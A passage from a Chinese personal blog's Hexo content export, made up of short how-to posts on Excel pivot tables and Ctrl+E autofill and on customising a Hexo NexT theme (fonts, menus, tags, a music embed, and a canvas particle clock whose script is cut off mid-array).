<li>添加【数据透视表和​​数据透视图向导】<br><a href="https://v2ray.dana5haw.com:8008/image/gzo6"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/image.png" alt="image.png"></a><br>最后是这样的效果：<br><a href="https://v2ray.dana5haw.com:8008/image/gX7e"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/image4cfc065d78271670.png" alt="image4cfc065d78271670.png"></a><h3 id="获取csv数据源"><a href="#获取csv数据源" class="headerlink" title="获取csv数据源"></a>获取csv数据源</h3>获取csv数据源，加载到现有工作表（one by one，添加csv，稍显效率低下(～﹃～)~zZ）：<br><a href="https://v2ray.dana5haw.com:8008/image/g413"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/imagecfbe3149d15cc196.png" alt="imagecfbe3149d15cc196.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/gTaB"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/imagef8724111722f7fbc.png" alt="imagef8724111722f7fbc.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/gKyp"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/image464f196e34b5cc1c.png" alt="image464f196e34b5cc1c.png"></a><h3 id="使用【多重合并计算数据区域】合并计算多个csv数据源"><a href="#使用【多重合并计算数据区域】合并计算多个csv数据源" class="headerlink" title="使用【多重合并计算数据区域】合并计算多个csv数据源"></a>使用【多重合并计算数据区域】合并计算多个csv数据源</h3>参考<a href="https://zhuanlan.zhihu.com/p/25367380">这篇教程</a><br><a href="https://v2ray.dana5haw.com:8008/image/geDh"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/imagedbd672947567aee1.png" alt="imagedbd672947567aee1.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/guJ7"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/imagebbe07c3d16df5f37.png" alt="imagebbe07c3d16df5f37.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/g2uY"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/imaged99683f75aa00bac.png" alt="imaged99683f75aa00bac.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/gO5x"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/image53aa2a3c54000c69.png" alt="image53aa2a3c54000c69.png"></a><br>最终，生成一个整体合并汇总的结果表，我们可以挑选显示单个或多个csv数据源。<br><a href="https://v2ray.dana5haw.com:8008/image/gfoS"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/image0f26f3859b4ba6ac.png" alt="image0f26f3859b4ba6ac.png"></a><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>主要参考<a href="https://zhuanlan.zhihu.com/p/25367380">这篇文章</a></li>
</ul>
]]></content>
      <categories>
        <category>excel</category>
      </categories>
      <tags>
        <tag>excel</tag>
        <tag>获取csv源数据</tag>
        <tag>合并计算</tag>
      </tags>
  </entry>
  <entry>
    <title>excel快捷键之快速统一添加域名后缀</title>
    <url>//posts/ZH-CN/Excel_Ctrl_E.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>统一给二级域名补全后缀。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9xzki5f4j305p04zwec.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>填写第一行示例之后，按住ctrl+E，实现自动填充。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9y1lnjp8j305l04a0sm.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>excel</category>
      </categories>
      <tags>
        <tag>excel快捷键</tag>
        <tag>快速统一添加域名后缀</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+next主题博客怎么添加友情链接</title>
    <url>//posts/ZH-CN/Hexo_Next_FriendLink.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>友情链接其实是个人的博客收藏夹，把喜欢的博客加到这儿来，方便随时访问，随时激励自己。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>超简单。只需要修改next主题配置文件_config.yml。文件位置：博客目录\themes\next<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gayn4jik7gj30nn0idq4q.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.jianshu.com/p/57dd558b2b42">https://www.jianshu.com/p/57dd558b2b42</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo+next主题</tag>
        <tag>添加友链</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+next主题设置版本声明：修改本文链接中显示的url</title>
    <url>//posts/ZH-CN/Hexo_Next_Statement.html</url>
    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>设置了next主题的版权声明之后，显示的本文链接域名是默认<a href="http://yoursite/，强迫症绝对无法忍受这种事情。">http://yoursite/，强迫症绝对无法忍受这种事情。</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gawikmr2e0j30qn04itd1.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="版权声明怎么弄"><a href="#版权声明怎么弄" class="headerlink" title="版权声明怎么弄"></a>版权声明怎么弄</h2><p>参考网上教程，7.x以上版本的next主题（x代表0-9之间的哪个数我就记不清了），有个超简单的设置方法。<br>修改next主题配置文件_config.yml，框起来的地方改成这样就行了。文件位置：博客目录\themes\next<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gawinvxq80j315i0igtam.jpg" alt="image.png"><br>还没完呢，不然你的版权声明很可能和我的一样，本文链接的域名是默认的很碍眼的<a href="http://yoursite/">http://yoursite/</a><br>接下来，检查一下博客配置文件_config.yml，看看url是不是默认值。如果是默认值，果断改成自己博客的域名，像我这样。文件位置：博客目录<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gawissxmntj315i0igdi9.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="http://smartsi.club/hexo-next-add-copyright-information.html">http://smartsi.club/hexo-next-add-copyright-information.html</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo+next主题</tag>
        <tag>版权声明</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo写博客如何设置多个标签和多个分类</title>
    <url>//posts/ZH-CN/Hexo_MultiTag_MultiCategorie.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>写了一篇博客，它可以划分到多个类别，可以打上多个标签，便于我们以后检索。就像描述一个苹果，我们可以打上标签：红富士、红苹果。可以分类：水果、健康生活。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>标准yaml语法，照着做就对了。千万注意，短横线后面要加上空格。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gawj2mt3w1j30hb06zdfu.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://aiellochan.com/2018/02/13/hexo/Hexo-%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%A4%9A%E4%B8%AA-categories/">https://aiellochan.com/2018/02/13/hexo/Hexo-%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%A4%9A%E4%B8%AA-categories/</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>设置多个标签</tag>
        <tag>设置多个分类</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客之更改permalink的格式为.html</title>
    <url>//posts/ZH-CN/Hexo_Permalink_Html.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章的访问链接默认的是这种格式<code>https://danashaw.gitee.io/2020/03/12/nginx%E4%B9%8Bhttps302%E8%B7%B3%E8%BD%AC%E4%B8%BAhttp%E6%80%8E%E4%B9%88%E5%8A%9E/#more</code>，我希望把这个链接改为.html结尾的，这样对搜索引擎更加友好。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="permalink设置方法"><a href="#permalink设置方法" class="headerlink" title="permalink设置方法"></a>permalink设置方法</h2><p>修改网站主配置文件<code>C:\Users\admin\myBlog\_config.yml</code>，修改<code>permalink部分</code>。如下：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gczl4k5pmrj30p90g8gnh.jpg" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://chaoo.oschina.io/2016/05/24/Hexo%E5%8D%9A%E5%AE%A2%E4%BC%98%E5%8C%96--%E5%BA%93%E3%80%81%E5%AD%97%E4%BD%93%E3%80%81%E6%94%B6%E5%BD%95%E3%80%81%E7%BB%9F%E8%AE%A1.html">参考文章</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>permalink格式修改</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客修改字体设置</title>
    <url>//posts/ZH-CN/Hexo_Font.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hexo+next主题，默认的字体太大了，不太好看。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>修改主题配置文件<code>C:\Users\admin\myBlog\themes\next\_config.yml</code>，更改<code>font</code>模块的设置。<br>参考<a href="https://io-oi.me/tech/noto-serif-sc-added-on-google-fonts/">网上的设置</a><a href="https://io-oi.me/tech/hexo-next-optimization/#%E4%BF%AE%E6%94%B9%E5%AD%97%E4%BD%93">修改配置文件</a>，将代码块字体设置为<code>EB Garamond</code>，其余字体设置为<code>Noto Serif SC</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnthmngmmj31f60u0tfi.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://io-oi.me/tech/hexo-next-optimization/#%E4%BF%AE%E6%94%B9%E5%AD%97%E4%BD%93">https://io-oi.me/tech/hexo-next-optimization/#%E4%BF%AE%E6%94%B9%E5%AD%97%E4%BD%93</a><br><a href="https://io-oi.me/tech/noto-serif-sc-added-on-google-fonts/">https://io-oi.me/tech/noto-serif-sc-added-on-google-fonts/</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>修改字体设置</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客同步部署到github和gitee-傻瓜式导入仓库</title>
    <url>//posts/ZH-CN/Hexo_Github_Gitee_Deploy.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>目前的博客是部署到github，考虑到github在国内的访问速度可能受到网络环境影响，就在国内gitee上也注册个号，把hexo博客的代码同步上去。（虽然我用谷歌浏览器访问，访问速度体验并不差，反正把鸡蛋分到多个篮子总是保险一点<em>-</em>）</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ol>
<li>注册gitee，绑定手机号之后才具有更多操作权限。绑了。</li>
<li>点击+号，新建仓库，导入github仓库<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gaygchrj9qj31cg0ptjuc.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gaygfhc0syj30ld0nsdgt.jpg" alt="image.png"><br>把github的仓库地址复制出来，导入到gitee<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gayghh0qx8j314a0g2404.jpg" alt="image.png"><br>选择gitee pages服务<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gayh08x52dj315e0qdgo8.jpg" alt="image.png"><br>默认配置，勾选强制https，更新即可部署成功。网址为博客访问链接。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gayh31fq6uj30uh0nuq4g.jpg" alt="image.png"></li>
</ol>
<h2 id="more……"><a href="#more……" class="headerlink" title="more……"></a>more……</h2><p>没有给gitee的博客地址绑定自己的域名。主要是gitee绑定自定义域名还得开通pro服务，虽然有一个月免费试用期，考虑到绑定gitee自定义域名，也没有太多意义，这个博客主要还是我自己记录自己查看，平时能使用github仓库顺畅访问博客，就足够了。把博客代码同步到gitee，相当于多一个备份，买了个保险，心安。<br>但是不知道为啥用gitee的地址访问博客，网站的icon就不见了？！还是留了个疙瘩在心里，可能哪天我还是会把这个问题给抹了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gayl4u8o4dj31f60tye81.jpg" alt="image.png"></p>
<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://cyneliu.github.io/2019/07/18/%E5%90%8C%E6%97%B6%E4%BD%BF%E7%94%A8Gitub%E5%92%8C%E7%A0%81%E4%BA%91%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2/">https://cyneliu.github.io/2019/07/18/%E5%90%8C%E6%97%B6%E4%BD%BF%E7%94%A8Gitub%E5%92%8C%E7%A0%81%E4%BA%91%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2/</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>github仓库导入gitee</tag>
        <tag>hexo博客同步部署到github和gitee</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客增加菜单项</title>
    <url>//posts/ZH-CN/Hexo_Add_Menu.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们增加【读书笔记】和【观影笔记】这两个菜单项。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><ul>
<li>修改next主题配置文件<code>C:\Users\admin\myBlog\themes\next\_config.yml</code>，将icon（icon在<a href="https://fontawesome.com/">这个网站</a>找）和菜单项对应起来。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gczo0wtqikj31f60u0qbh.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gczo1yw2dqj31f60u0qbx.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcznva8virj30p90g8wfr.jpg" alt="image.png"></li>
</ul>
<blockquote>
<p>扩展：这个icon设置之后，网站的网页渲染结果如下：</p>
</blockquote>
<ul>
<li><p><code>&lt;i class=&quot;fa fa-fw fa-book&quot;&gt;&lt;/i&gt;</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gczo4wlyybj31f60u0jvu.jpg" alt="image.png"></p>
</li>
<li><p><code>&lt;i class=&quot;fa fa-fw fa-youtube&quot;&gt;&lt;/i&gt;</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gczo5fij08j31f60u0n7a.jpg" alt="image.png"></p>
</li>
<li><p>修改文件<code>C:\Users\admin\myBlog\themes\next\languages\zh-CN.yml</code>，将菜单项的中英文对应起来<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcznwg94nzj30p90g8jsj.jpg" alt="image.png"></p>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://prozhuchen.github.io/2017/01/05/web_change/">参考文章：这里没有设置图标，会报错</a><br><a href="https://finisky.github.io/2019/02/24/customizedcategory/">参考文章：这个文章解决了上面的问题</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>增加菜单项</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客常用内置标签</title>
    <url>//posts/ZH-CN/Hexo_Tag_Builtin.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一个月以前就注意到这些稍微进阶的用法，当时没仔细研究。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="文本居中标签"><a href="#文本居中标签" class="headerlink" title="文本居中标签"></a>文本居中标签</h2><p>可以用做文章标题，或者突出引用内容。<br>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% centerquote %&#125;blah blah blah&#123;% endcenterquote %&#125;</span><br></pre></td></tr></table></figure>
<p>效果图：</p>
<blockquote class="blockquote-center"><p>blah blah blah</p>
</blockquote>

<h2 id="note标签"><a href="#note标签" class="headerlink" title="note标签"></a>note标签</h2><p>可以用来做注解或者强调重点。<br>在使用之前，我们在主题配置文件里面设置<code>note</code>模块：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcntwgpvaaj31f60u0wkv.jpg" alt="image.png"><br>语法：<code>[class]</code>可以是<code>default</code>、<code>primary</code>、<code>success</code>、<code>info</code>、<code>warning</code>、<code>danger</code>、不指定。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note [class] %&#125;</span><br><span class="line">文本内容 (支持行内标签)</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>
<p>效果图：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcntunscd7j30rm0h23yu.jpg" alt="image.png"></p>
<h2 id="label标签"><a href="#label标签" class="headerlink" title="label标签"></a>label标签</h2><p>可以用来给文字添加背景色。<br>语法：<code>[class]</code>可以是<code>default</code>、<code>primary</code>、<code>success</code>、<code>info</code>、<code>warning</code>、<code>danger</code>。默认是<code>default</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% label [class] @text %&#125;</span><br></pre></td></tr></table></figure>
<p>效果图：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnu0dr8mqj30j809sglz.jpg" alt="image.png"></p>
<h2 id="button按钮"><a href="#button按钮" class="headerlink" title="button按钮"></a>button按钮</h2><p>和超链接是一回事，只不过这个超链接的形式是按钮。<br>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% button /path/to/url/, text, icon [class], title %&#125;</span><br></pre></td></tr></table></figure>
<p>等价于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% btn /path/to/url/, text, icon [class], title %&#125;</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% btn #, 文本 %&#125;</span><br><span class="line">&#123;% btn #, 文本 &amp; 标题,, 标题 %&#125;</span><br><span class="line">&#123;% btn #, 文本 &amp; 图标, home %&#125;</span><br><span class="line">&#123;% btn #, 文本 &amp; 大图标 (固定宽度), home fa-fw fa-lg %&#125;</span><br></pre></td></tr></table></figure>
<p>效果图：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnu3r83e9j30tz091gm7.jpg" alt="image.png"><br>注意，图标可以自己修改，在<a href="https://fontawesome.com/v4.7.0/icons/">icon网站</a>找到喜欢的图标，替换icon[class]就可以了。<br>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% btn #, 文本 &amp; 大图标 (固定宽度), fa fa-address-book %&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>fa fa-address-book</code>就是网站里面这个图标对应的<code>class</code>：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnua1lfmnj31f60u013a.jpg" alt="image.png"></p>
<h2 id="tab标签"><a href="#tab标签" class="headerlink" title="tab标签"></a>tab标签</h2><p>用来创建tab选项卡，比较酷炫。<br>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs [Unique name], [index] %&#125;</span><br><span class="line">  &lt;!-- tab [Tab caption]@[icon] --&gt;</span><br><span class="line">  标签页内容（支持行内标签）</span><br><span class="line">  &lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs Tab标签列表 %&#125;</span><br><span class="line">  &lt;!-- tab 标签页1 --&gt;</span><br><span class="line">    标签页1文本内容</span><br><span class="line">  &lt;!-- endtab --&gt;</span><br><span class="line">  &lt;!-- tab 标签页2 --&gt;</span><br><span class="line">    标签页2文本内容</span><br><span class="line">  &lt;!-- endtab --&gt;</span><br><span class="line">  &lt;!-- tab 标签页3 --&gt;</span><br><span class="line">    标签页3文本内容</span><br><span class="line">  &lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure>
<p>效果：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnubx4711j30so052jre.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://tangjiuyang.com/Hexo/hexo-writing-skills.html">https://tangjiuyang.com/Hexo/hexo-writing-skills.html</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>常用内置标签</tag>
        <tag>文本居中标签</tag>
        <tag>note标签</tag>
        <tag>label标签</tag>
        <tag>button按钮</tag>
        <tag>tab标签</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客开启标签的icon</title>
    <url>//posts/ZH-CN/Hexo_Tag_Icon.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hexo+next主题，默认标签的符号是<code>#</code>，我想把这个<code>#</code>改成标签的icon。默认的标签符号像这样：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gco0lpphm9j31f60u0n7g.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>只需要修改主题配置文件<code>C:\Users\admin\myBlog\themes\next\_config.yml</code>，将<code>tag_icon</code>设置为<code>true</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gco0g8rvznj30p90ek75i.jpg" alt="image.png"><br>效果图：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gco0hw396fj31f60u04qp.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://mxdzs0612.github.io/%E5%85%B6%E5%AE%83%E6%8A%80%E6%9C%AF/2019-07-31-HexoBlog3">https://mxdzs0612.github.io/%E5%85%B6%E5%AE%83%E6%8A%80%E6%9C%AF/2019-07-31-HexoBlog3</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>开启标签的icon</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客插入网易云音乐外链</title>
    <url>//posts/ZH-CN/Hexo_MusicLink.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>给博客文章插入音乐，也是非常酷炫的操作。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>在文章里面写入这段代码：iframe标签的内容是从网易云生成的外链，用center标签包含起来，这个外链图标就会位于网页正中的位置。</p>
<blockquote>
<p>怎么生成外链？<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gco20rhz4cj31f60u0aj5.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gco21oeq5qj31f60u0gqe.jpg" alt="image.png"></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;</span><br><span class="line">  &lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=329 height=86 src=&quot;//music.163.com/outchain/player?type=2&amp;id=34613621&amp;auto=0&amp;height=66&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure>
<p>效果图：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnuhhoydcj30tn03kaak.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://tangjiuyang.com/Hexo/hexo-writing-skills.html">https://tangjiuyang.com/Hexo/hexo-writing-skills.html</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>网易云音乐外链</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客设置MacPanel特效的代码框</title>
    <url>//posts/ZH-CN/Hexo_MacPanel_CodeBlock.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>MacPanel特效的代码框挺好看的。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>修改主题配置文件<code>C:\Users\admin\myBlog\themes\next\_config.yml</code>，修改<code>codeblock</code>模块的设置。将<code>show_result</code>设置为<code>true</code>，<code>style</code>设置为<code>mac</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnshotlcxj31f60u0jwf.jpg" alt="image.png"></p>
<p>效果图：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnsjc4b7vj30u90hggn2.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://jrbcode.github.io/posts/63c4b34f.html">https://jrbcode.github.io/posts/63c4b34f.html</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>设置MacPanel特效的代码框</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客设置canvas粒子时钟</title>
    <url>//posts/ZH-CN/Hexo_Canvas_Clock.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要是觉得这个canvas粒子时钟很炫酷。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><ol>
<li>进入目录<code>C:\Users\admin\myBlog\themes\next\layout\_macro</code>修改文件<code>sidebar.swig</code>。</li>
</ol>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnrwjs1upj31f60u043k.jpg" alt="image.png"></p>
<details><summary>点击展开代码内容</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;&quot;&gt;</span><br><span class="line">&lt;canvas id=&quot;canvas&quot; style=&quot;width:60%;&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/canvas-dance-time.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

</p>
</details>

<ol start="2">
<li>进入目录<code>C:\Users\admin\myBlog\themes\next\source\js</code>，新建文件<code>canvas-dance-time.js</code>。</li>
</ol>
<details><summary>点击展开代码内容</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var WINDOW_WIDTH = 820;</span><br><span class="line">    var WINDOW_HEIGHT = 250;</span><br><span class="line">    var RADIUS = 7; //球半径</span><br><span class="line">    var NUMBER_GAP = 10; //数字之间的间隙</span><br><span class="line">    var u=0.65; //碰撞能量损耗系数</span><br><span class="line">    var context; //Canvas绘制上下文</span><br><span class="line">    var balls = []; //存储彩色的小球</span><br><span class="line">    const colors = [&quot;#33B5E5&quot;,&quot;#0099CC&quot;,&quot;#AA66CC&quot;,&quot;#9933CC&quot;,&quot;#99CC00&quot;,&quot;#669900&quot;,&quot;#FFBB33&quot;,&quot;#FF8800&quot;,&quot;#FF4444&quot;,&quot;#CC0000&quot;]; //彩色小球的颜色</span><br><span class="line">    var currentNums = []; //屏幕显示的8个字符</span><br><span class="line">    var digit =</span><br><span class="line">        [</span><br><span class="line">            [</span><br><span class="line">                [0,0,1,1,1,0,0],</span><br><span class="line">                [0,1,1,0,1,1,0],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [0,1,1,0,1,1,0],</span><br><span class="line">                [0,0,1,1,1,0,0]</span><br><span class="line">            ],//0</span><br><span class="line">            [</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,1,1,1,1,0,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [1,1,1,1,1,1,1]</span><br><span class="line">            ],//1</span><br><span class="line">            [</span><br><span class="line">                [0,1,1,1,1,1,0],</span><br><span class="line">                